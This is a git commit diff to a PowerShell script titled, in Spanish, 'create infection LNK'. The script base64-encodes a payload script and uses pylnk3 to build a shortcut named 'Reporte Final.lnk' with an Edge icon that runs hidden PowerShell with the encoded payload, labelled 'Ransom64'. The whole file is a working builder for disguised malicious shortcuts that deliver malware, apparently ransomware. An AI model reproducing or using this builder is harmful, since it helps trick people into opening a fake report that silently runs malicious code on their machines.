b1c7d0a5f5ffb66814f6cdfd5ab11f13e58525cd
Joy Dragon <joydragon@gmail.com>
2023-08-29 21:18:04 +0000

    Reconfigurando builder de LNK.

--- crear LNK de infeccion.ps1
+++ crear LNK de infeccion.ps1
@@ -1,11 +1,19 @@
 ﻿$base = $PSScriptRoot+"\";
+if($base -eq "\"){$base = ".\"}
+
+$output = $base + "output\";
+$payloads = $base + "payloads\";
+
+if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
+if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}
+
 $archivo = "MiInfeccion.ps1"
 $archivo_lnk = "Reporte Final.lnk"
 
-$cont = Get-Content $base$archivo
-$cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont))
+$cont = Get-Content $payloads$archivo;
+$cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont));
 
-pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $base\$archivo_lnk
+pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $output$archivo_lnk
 
 <# Este codigo no funciona por usar API de Windows, se debe usar pylnk3
 $WshShell = New-Object -comObject WScript.Shell
